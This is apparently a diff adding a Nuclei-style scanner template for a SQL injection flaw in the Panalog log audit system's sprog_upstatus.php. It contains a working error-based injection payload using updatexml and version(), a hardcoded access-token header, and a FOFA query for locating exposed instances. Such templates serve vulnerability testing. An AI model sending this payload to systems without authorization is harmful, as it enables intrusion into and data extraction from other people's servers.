@@ -1,0 +1,32 @@
+id: Panalog-sprog_upstatus-sql
+
+info:
+  name: Panalog 日志审计系统 sprog_upstatus.php SQL注入 (XVE-2024-5232)
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="Maintain/cloud_index.php"
+
+  tags: SQL Injection
+  
+http:
+  - raw:
+      - |
+        GET /Maintain/sprog_upstatus.php?status=1&rdb=1&id=1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1) HTTP/1.1
+        Host: {{Hostname}}
+        Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'XPATH syntax error:'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
